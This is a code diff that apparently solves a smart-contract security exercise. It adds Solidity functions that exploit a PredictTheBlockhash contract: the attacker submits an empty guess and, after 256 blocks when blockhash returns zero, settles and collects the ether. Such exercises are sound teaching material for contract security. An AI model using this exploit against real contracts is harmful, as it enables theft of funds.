@@ -52,5 +52,20 @@ contract ExploitContract {
         predictTheBlockhash = _predictTheBlockhash;
     }
 
-    // write your exploit code below
+    // Write your exploit code below
+    function lockInGuess() public payable {
+        bytes32 empty;
+        predictTheBlockhash.lockInGuess{value: 1 ether}(empty);
+    }
+
+    /// @dev blockhash function only returns the actual block hash for the last 256 blocks
+    /// after 256 blocks, blockhash will return 32 0's. This means we submit an empty guess and
+    /// then wait for 256 blocks to pass. After that, we can settle.
+    function exploit() public {
+        predictTheBlockhash.settle();
+    }
+
+    receive() external payable {}
+
+    fallback() external payable {}
 }
